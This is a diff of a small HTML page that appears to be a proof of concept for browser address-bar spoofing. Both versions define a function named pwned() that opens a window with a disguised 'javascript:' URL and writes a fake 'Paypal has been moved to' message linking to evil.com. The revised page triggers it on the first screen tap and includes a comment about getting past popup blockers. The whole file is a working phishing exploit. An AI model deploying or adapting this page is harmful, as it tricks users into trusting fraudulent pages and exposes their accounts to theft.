@@ -1,8 +1,30 @@
-<script>
-function pwned() {
-var t = window.open('javascript:#verylongurl.google.facebook.com');
-t.document.write(`<h1>Paypal has been moved to</h1><a href="https://evil.com">Evil.com</a>`);
-t.stop();
-}
-</script>
-<a href="https://legitsite.com" target="ss" onclick="setTimeout('pwned()','500')">click me2</a>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Tap Anywhere</title>
+  <script>
+    function pwned() {
+      var t = window.open('javascript:#verylongurl.google.facebook.com');
+      if (t) {
+        t.document.write(`<h1>Paypal has been moved to</h1><a href="https://evil.com">Evil.com</a>`);
+        t.stop();
+      } else {
+        alert("Popup blocked!");
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', function () {
+      function handleTap(e) {
+        document.body.removeEventListener('touchstart', handleTap);
+        // Call immediately — avoid delay or popup may get blocked
+        pwned();
+      }
+
+      document.body.addEventListener('touchstart', handleTap, { once: true });
+    });
+  </script>
+</head>
+<body>
+  <h1 style="text-align:center; margin-top: 100px;">📱 Tap anywhere to continue</h1>
+</body>
+</html>
